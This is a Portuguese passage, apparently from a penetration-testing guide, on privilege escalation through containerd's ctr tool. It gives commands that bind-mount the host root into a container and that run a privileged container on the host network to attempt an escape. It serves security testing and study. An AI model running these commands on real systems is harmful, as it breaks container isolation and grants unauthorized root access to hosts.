...
```
Em seguida, **execute uma dessas images com a raiz do host montada recursivamente via bind na raiz do container**:<sup>[[3]](#references)[[4]](#references)</sup>
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Execute um container em modo privilegiado e teste um escape.\
Você pode executar um container usando a rede do host como:<sup>[[5]](#references)[[6]](#references)</sup>
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
`--privileged` concede ao processo as capacidades efetivas do Linux do caller e remove vários controles de isolamento, mas um escape continua dependente do ambiente; use as técnicas mencionadas na página a seguir para testá-lo:<sup>[[5]](#references)</sup>
...
- [4] [Documentação do kernel Linux sobre shared-subtree](https://docs.kernel.org/filesystems/sharedsubtree.html)
